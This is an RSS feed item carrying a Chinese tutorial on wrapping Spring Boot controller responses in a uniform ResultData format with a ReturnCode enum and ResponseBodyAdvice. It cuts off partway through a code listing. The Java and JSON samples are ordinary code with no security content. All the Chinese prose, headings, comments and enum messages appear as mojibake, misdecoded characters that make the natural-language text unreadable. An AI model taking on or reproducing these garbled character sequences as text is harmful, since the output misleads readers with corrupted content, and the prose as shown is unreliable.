<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
            <channel>
            <title>å¼€å‘è€…å¤´æ¡</title>
            <link>http://toutiao.io/</link>
            <description></description>
<item>
<guid>4e1a5a25222c9f1fa43fa20c92e9eb2e</guid>
<title>Spring Boot å¦‚ä½•ç»Ÿä¸€åç«¯è¿”å›æ ¼å¼ï¼Ÿè€é¸Ÿä»¬éƒ½æ˜¯è¿™æ ·ç©çš„</title>
<link>https://toutiao.io/k/290ect3</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; data-website=&quot;https://www.mdnice.com&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages&quot; data-croporisrc=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699G3oBEfic7adODd5HlOzXVxLgDu1sgreZv5vrd1SaRITNCaT17SVcT1w/0?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;900.0000000000001&quot; data-cropy1=&quot;0&quot; data-cropy2=&quot;469.0140845070423&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.5211111111111111&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699qibG4OFemkoiaP7pAkgs87ibAeWW4KIwXA5Acia5xbOicQbkyHV38n5yicvA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;900&quot;/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯é£˜æ¸ºã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä»Šå¤©æˆ‘ä»¬æ¥èŠä¸€èŠåœ¨åŸºäºSpringBootå‰åç«¯åˆ†ç¦»å¼€å‘æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•&lt;span&gt;å‹å¥½çš„&lt;/span&gt;è¿”å›ç»Ÿä¸€çš„æ ‡å‡†æ ¼å¼ä»¥åŠå¦‚ä½•ä¼˜é›…çš„å¤„ç†å…¨å±€å¼‚å¸¸ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆè¦è¿”å›ç»Ÿä¸€çš„æ ‡å‡†æ ¼å¼ï¼Ÿ&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;ä¸ºä»€ä¹ˆè¦å¯¹SpringBootè¿”å›ç»Ÿä¸€çš„æ ‡å‡†æ ¼å¼&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒSpringBootçš„è¿”å›æ ¼å¼å¸¸è§çš„æœ‰ä¸‰ç§ï¼š&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span&gt;ç¬¬ä¸€ç§ï¼šè¿”å› String&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â StringÂ &lt;span&gt;getStr&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â Â &lt;span&gt;return&lt;/span&gt;Â &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­¤æ—¶è°ƒç”¨æ¥å£è·å–åˆ°çš„è¿”å›å€¼æ˜¯è¿™æ ·ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;hello,javadaily&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span&gt;ç¬¬äºŒç§ï¼šè¿”å›è‡ªå®šä¹‰å¯¹è±¡&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/aniaml&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â AniamlÂ &lt;span&gt;getAniaml&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â Â AniamlÂ aniamlÂ =Â &lt;span&gt;new&lt;/span&gt;Â Aniaml(&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;&quot;pig&quot;&lt;/span&gt;);&lt;br/&gt;Â Â &lt;span&gt;return&lt;/span&gt;Â aniaml;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­¤æ—¶è°ƒç”¨æ¥å£è·å–åˆ°çš„è¿”å›å€¼æ˜¯è¿™æ ·ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â &lt;span&gt;&quot;id&quot;&lt;/span&gt;:Â &lt;span&gt;1&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;name&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;pig&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span&gt;ç¬¬ä¸‰ç§ï¼šæ¥å£å¼‚å¸¸&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;@GetMapping(&lt;span&gt;&quot;/error&quot;&lt;/span&gt;)&lt;br/&gt;publicÂ intÂ &lt;span&gt;&lt;span&gt;error&lt;/span&gt;&lt;/span&gt;(){&lt;br/&gt;Â Â Â Â intÂ iÂ =Â 9/0;&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â i;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­¤æ—¶è°ƒç”¨æ¥å£è·å–åˆ°çš„è¿”å›å€¼æ˜¯è¿™æ ·ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;2021-07-08T08:05:15.423+00:00&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;status&quot;&lt;/span&gt;:Â &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;error&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;InternalÂ ServerÂ Error&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;path&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åŸºäºä»¥ä¸Šç§ç§æƒ…å†µï¼Œå¦‚æœä½ å’Œå‰ç«¯å¼€å‘äººå‘˜è”è°ƒæ¥å£å¥¹ä»¬å°±ä¼šå¾ˆæ‡µé€¼ï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰ç»™ä»–ä¸€ä¸ªç»Ÿä¸€çš„æ ¼å¼ï¼Œå‰ç«¯äººå‘˜ä¸çŸ¥é“å¦‚ä½•å¤„ç†è¿”å›å€¼ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿˜æœ‰ç”šè€…ï¼Œæœ‰çš„åŒå­¦æ¯”å¦‚å°å¼ å–œæ¬¢å¯¹ç»“æœè¿›è¡Œå°è£…ï¼Œä»–ä½¿ç”¨äº†Resultå¯¹è±¡ï¼Œå°ç‹ä¹Ÿå–œæ¬¢å¯¹ç»“æœè¿›è¡ŒåŒ…è£…ï¼Œä½†æ˜¯ä»–å´ä½¿ç”¨çš„æ˜¯Responseå¯¹è±¡ï¼Œå½“å‡ºç°è¿™ç§æƒ…å†µæ—¶æˆ‘ç›¸ä¿¡å‰ç«¯äººå‘˜ä¸€å®šä¼šæŠ“ç‹‚çš„ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ‰€ä»¥æˆ‘ä»¬é¡¹ç›®ä¸­æ˜¯éœ€è¦å®šä¹‰ä¸€ä¸ªç»Ÿä¸€çš„æ ‡å‡†è¿”å›æ ¼å¼çš„ã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;å®šä¹‰è¿”å›æ ‡å‡†æ ¼å¼&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä¸€ä¸ªæ ‡å‡†çš„è¿”å›æ ¼å¼è‡³å°‘åŒ…å«3éƒ¨åˆ†ï¼š&lt;/p&gt;&lt;ol data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;status çŠ¶æ€å€¼ï¼šç”±åç«¯ç»Ÿä¸€å®šä¹‰å„ç§è¿”å›ç»“æœçš„çŠ¶æ€ç &lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;message æè¿°ï¼šæœ¬æ¬¡æ¥å£è°ƒç”¨çš„ç»“æœæè¿°&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;data æ•°æ®ï¼šæœ¬æ¬¡è¿”å›çš„æ•°æ®ã€‚&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â &lt;span&gt;&quot;status&quot;&lt;/span&gt;:&lt;span&gt;&quot;100&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;message&quot;&lt;/span&gt;:&lt;span&gt;&quot;æ“ä½œæˆåŠŸ&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;data&quot;&lt;/span&gt;:&lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å½“ç„¶ä¹Ÿå¯ä»¥æŒ‰éœ€åŠ å…¥å…¶ä»–æ‰©å±•å€¼ï¼Œæ¯”å¦‚æˆ‘ä»¬å°±åœ¨è¿”å›å¯¹è±¡ä¸­æ·»åŠ äº†æ¥å£è°ƒç”¨æ—¶é—´&lt;/p&gt;&lt;ol start=&quot;4&quot; data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;timestamp: æ¥å£è°ƒç”¨æ—¶é—´&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;å®šä¹‰è¿”å›å¯¹è±¡&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@Data&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;&lt;span&gt;class&lt;/span&gt;Â &lt;span&gt;ResultData&lt;/span&gt;&amp;lt;&lt;span&gt;T&lt;/span&gt;&amp;gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â &lt;span&gt;/**Â ç»“æœçŠ¶æ€Â ,å…·ä½“çŠ¶æ€ç å‚è§ResultData.java*/&lt;/span&gt;&lt;br/&gt;Â Â &lt;span&gt;private&lt;/span&gt;Â &lt;span&gt;int&lt;/span&gt;Â status;&lt;br/&gt;Â Â &lt;span&gt;private&lt;/span&gt;Â StringÂ message;&lt;br/&gt;Â Â &lt;span&gt;private&lt;/span&gt;Â TÂ data;&lt;br/&gt;Â Â &lt;span&gt;private&lt;/span&gt;Â &lt;span&gt;long&lt;/span&gt;Â timestampÂ ;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;Â Â &lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;ResultData&lt;/span&gt;Â &lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â Â Â Â &lt;span&gt;this&lt;/span&gt;.timestampÂ =Â System.currentTimeMillis();&lt;br/&gt;Â Â }&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;Â Â &lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;static&lt;/span&gt;Â &amp;lt;T&amp;gt;Â &lt;span&gt;ResultData&amp;lt;T&amp;gt;Â &lt;span&gt;success&lt;/span&gt;&lt;span&gt;(TÂ data)&lt;/span&gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â Â Â ResultData&amp;lt;T&amp;gt;Â resultDataÂ =Â &lt;span&gt;new&lt;/span&gt;Â ResultData&amp;lt;&amp;gt;();&lt;br/&gt;Â Â Â Â resultData.setStatus(ReturnCode.RC100.getCode());&lt;br/&gt;Â Â Â Â resultData.setMessage(ReturnCode.RC100.getMessage());&lt;br/&gt;Â Â Â Â resultData.setData(data);&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â resultData;&lt;br/&gt;Â Â }&lt;br/&gt;&lt;br/&gt;Â Â &lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;static&lt;/span&gt;Â &amp;lt;T&amp;gt;Â &lt;span&gt;ResultData&amp;lt;T&amp;gt;Â &lt;span&gt;fail&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt;Â code,Â StringÂ message)&lt;/span&gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â Â Â ResultData&amp;lt;T&amp;gt;Â resultDataÂ =Â &lt;span&gt;new&lt;/span&gt;Â ResultData&amp;lt;&amp;gt;();&lt;br/&gt;Â Â Â Â resultData.setStatus(code);&lt;br/&gt;Â Â Â Â resultData.setMessage(message);&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â resultData;&lt;br/&gt;Â Â }&lt;br/&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;å®šä¹‰çŠ¶æ€ç &lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;publicÂ enumÂ ReturnCodeÂ {&lt;br/&gt;Â Â Â Â /**æ“ä½œæˆåŠŸ**/&lt;br/&gt;Â Â Â Â RC100(100,&lt;span&gt;&quot;æ“ä½œæˆåŠŸ&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**æ“ä½œå¤±è´¥**/&lt;br/&gt;Â Â Â Â RC999(999,&lt;span&gt;&quot;æ“ä½œå¤±è´¥&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**æœåŠ¡é™æµ**/&lt;br/&gt;Â Â Â Â RC200(200,&lt;span&gt;&quot;æœåŠ¡å¼€å¯é™æµä¿æŠ¤,è¯·ç¨åå†è¯•!&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**æœåŠ¡é™çº§**/&lt;br/&gt;Â Â Â Â RC201(201,&lt;span&gt;&quot;æœåŠ¡å¼€å¯é™çº§ä¿æŠ¤,è¯·ç¨åå†è¯•!&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**çƒ­ç‚¹å‚æ•°é™æµ**/&lt;br/&gt;Â Â Â Â RC202(202,&lt;span&gt;&quot;çƒ­ç‚¹å‚æ•°é™æµ,è¯·ç¨åå†è¯•!&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**ç³»ç»Ÿè§„åˆ™ä¸æ»¡è¶³**/&lt;br/&gt;Â Â Â Â RC203(203,&lt;span&gt;&quot;ç³»ç»Ÿè§„åˆ™ä¸æ»¡è¶³è¦æ±‚,è¯·ç¨åå†è¯•!&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**æˆæƒè§„åˆ™ä¸é€šè¿‡**/&lt;br/&gt;Â Â Â Â RC204(204,&lt;span&gt;&quot;æˆæƒè§„åˆ™ä¸é€šè¿‡,è¯·ç¨åå†è¯•!&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**access_denied**/&lt;br/&gt;Â Â Â Â RC403(403,&lt;span&gt;&quot;æ— è®¿é—®æƒé™,è¯·è”ç³»ç®¡ç†å‘˜æˆäºˆæƒé™&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**access_denied**/&lt;br/&gt;Â Â Â Â RC401(401,&lt;span&gt;&quot;åŒ¿åç”¨æˆ·è®¿é—®æ— æƒé™èµ„æºæ—¶çš„å¼‚å¸¸&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â /**æœåŠ¡å¼‚å¸¸**/&lt;br/&gt;Â Â Â Â RC500(500,&lt;span&gt;&quot;ç³»ç»Ÿå¼‚å¸¸ï¼Œè¯·ç¨åé‡è¯•&quot;&lt;/span&gt;),&lt;br/&gt;&lt;br/&gt;Â Â Â Â INVALID_TOKEN(2001,&lt;span&gt;&quot;è®¿é—®ä»¤ç‰Œä¸åˆæ³•&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â ACCESS_DENIED(2003,&lt;span&gt;&quot;æ²¡æœ‰æƒé™è®¿é—®è¯¥èµ„æº&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â CLIENT_AUTHENTICATION_FAILED(1001,&lt;span&gt;&quot;å®¢æˆ·ç«¯è®¤è¯å¤±è´¥&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â USERNAME_OR_PASSWORD_ERROR(1002,&lt;span&gt;&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;&lt;/span&gt;),&lt;br/&gt;Â Â Â Â UNSUPPORTED_GRANT_TYPE(1003,Â &lt;span&gt;&quot;ä¸æ”¯æŒçš„è®¤è¯æ¨¡å¼&quot;&lt;/span&gt;);&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;Â Â Â Â /**è‡ªå®šä¹‰çŠ¶æ€ç **/&lt;br/&gt;Â Â Â Â privateÂ finalÂ intÂ code;&lt;br/&gt;Â Â Â Â /**è‡ªå®šä¹‰æè¿°**/&lt;br/&gt;Â Â Â Â privateÂ finalÂ StringÂ message;&lt;br/&gt;&lt;br/&gt;Â Â Â Â ReturnCode(intÂ code,Â StringÂ message){&lt;br/&gt;Â Â Â Â Â Â Â Â this.codeÂ =Â code;&lt;br/&gt;Â Â Â Â Â Â Â Â this.messageÂ =Â message;&lt;br/&gt;Â Â Â Â }&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;Â Â Â Â publicÂ intÂ &lt;span&gt;&lt;span&gt;getCode&lt;/span&gt;&lt;/span&gt;()Â {&lt;br/&gt;Â Â Â Â Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â code;&lt;br/&gt;Â Â Â Â }&lt;br/&gt;&lt;br/&gt;Â Â Â Â publicÂ StringÂ &lt;span&gt;&lt;span&gt;getMessage&lt;/span&gt;&lt;/span&gt;()Â {&lt;br/&gt;Â Â Â Â Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â message;&lt;br/&gt;Â Â Â Â }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;ç»Ÿä¸€è¿”å›æ ¼å¼&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â ResultData&amp;lt;String&amp;gt;Â &lt;span&gt;getStr&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â &lt;span&gt;return&lt;/span&gt;Â ResultData.success(&lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­¤æ—¶è°ƒç”¨æ¥å£è·å–åˆ°çš„è¿”å›å€¼æ˜¯è¿™æ ·ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â &lt;span&gt;&quot;status&quot;&lt;/span&gt;:Â &lt;span&gt;100&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;message&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;data&quot;&lt;/span&gt;:Â &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;:Â &lt;span&gt;1625736481648&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;httpStatus&quot;&lt;/span&gt;:Â &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™æ ·ç¡®å®å·²ç»å®ç°äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œæˆ‘åœ¨å¾ˆå¤šé¡¹ç›®ä¸­çœ‹åˆ°çš„éƒ½æ˜¯è¿™ç§å†™æ³•ï¼Œåœ¨Controllerå±‚é€šè¿‡&lt;code&gt;ResultData.success()&lt;/code&gt;å¯¹è¿”å›ç»“æœè¿›è¡ŒåŒ…è£…åè¿”å›ç»™å‰ç«¯ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬ä¸å¦¨åœä¸‹æ¥æƒ³æƒ³ï¼Œè¿™æ ·åšæœ‰ä»€ä¹ˆå¼Šç«¯å‘¢ï¼Ÿ&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span&gt;æœ€å¤§çš„å¼Šç«¯å°±æ˜¯æˆ‘ä»¬åé¢æ¯å†™ä¸€ä¸ªæ¥å£éƒ½éœ€è¦è°ƒç”¨&lt;code&gt;ResultData.success()&lt;/code&gt;è¿™è¡Œä»£ç å¯¹ç»“æœè¿›è¡ŒåŒ…è£…ï¼Œé‡å¤åŠ³åŠ¨ï¼Œæµªè´¹ä½“åŠ›ï¼›&lt;br/&gt;&lt;br/&gt;è€Œä¸”è¿˜å¾ˆå®¹æ˜“è¢«å…¶ä»–è€é¸Ÿç»™å˜²ç¬‘ã€‚&lt;/span&gt;&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699DGNhndOUYozjUs4rrYMKxpOEEkTiaW15gk9lPPwNPQo3hibG4fElxHPw/640?wx_fmt=png&quot; data-type=&quot;png&quot;/&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ‰€ä»¥å‘¢æˆ‘ä»¬éœ€è¦å¯¹ä»£ç è¿›è¡Œä¼˜åŒ–ï¼Œç›®æ ‡å°±æ˜¯ä¸è¦æ¯ä¸ªæ¥å£éƒ½æ‰‹å·¥åˆ¶å®š&lt;code&gt;ResultData&lt;/code&gt;è¿”å›å€¼ã€‚&lt;/p&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;é«˜çº§å®ç°æ–¹å¼&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¦ä¼˜åŒ–è¿™æ®µä»£ç å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦å€ŸåŠ©SpringBootæä¾›çš„&lt;code&gt;ResponseBodyAdvice&lt;/code&gt;å³å¯ã€‚&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span&gt;â€œ&lt;/span&gt;&lt;p&gt;ResponseBodyAdviceçš„ä½œç”¨ï¼šæ‹¦æˆªControlleræ–¹æ³•çš„è¿”å›å€¼ï¼Œç»Ÿä¸€å¤„ç†è¿”å›å€¼/å“åº”ä½“ï¼Œä¸€èˆ¬ç”¨æ¥ç»Ÿä¸€è¿”å›æ ¼å¼ï¼ŒåŠ è§£å¯†ï¼Œç­¾åç­‰ç­‰ã€‚&lt;/p&gt;&lt;span&gt;â€&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å…ˆæ¥çœ‹ä¸‹&lt;code&gt;ResponseBodyAdvice&lt;/code&gt;çš„æºç ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;&lt;span&gt;interface&lt;/span&gt;Â &lt;span&gt;ResponseBodyAdvice&lt;/span&gt;&amp;lt;&lt;span&gt;T&lt;/span&gt;&amp;gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â &lt;span&gt;/**&lt;br/&gt;Â Â *Â æ˜¯å¦æ”¯æŒadviceåŠŸèƒ½&lt;br/&gt;Â Â *Â trueÂ æ”¯æŒï¼ŒfalseÂ ä¸æ”¯æŒ&lt;br/&gt;Â Â */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;&lt;span&gt;boolean&lt;/span&gt;Â &lt;span&gt;supports&lt;/span&gt;&lt;span&gt;(MethodParameterÂ var1,Â Class&amp;lt;?Â extendsÂ HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt;Â var2)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;Â Â Â &lt;span&gt;/**&lt;br/&gt;Â Â *Â å¯¹è¿”å›çš„æ•°æ®è¿›è¡Œå¤„ç†&lt;br/&gt;Â Â */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;@Nullable&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;TÂ &lt;span&gt;beforeBodyWrite&lt;/span&gt;&lt;span&gt;(@NullableÂ TÂ var1,Â MethodParameterÂ var2,Â MediaTypeÂ var3,Â Class&amp;lt;?Â extendsÂ HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt;Â var4,Â ServerHttpRequestÂ var5,Â ServerHttpResponseÂ var6)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬åªéœ€è¦ç¼–å†™ä¸€ä¸ªå…·ä½“å®ç°ç±»å³å¯&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;/**&lt;br/&gt;Â *Â &lt;span&gt;@author&lt;/span&gt;Â jam&lt;br/&gt;Â *Â &lt;span&gt;@date&lt;/span&gt;Â 2021/7/8Â 10:10Â ä¸Šåˆ&lt;br/&gt;Â */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@RestControllerAdvice&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt;Â 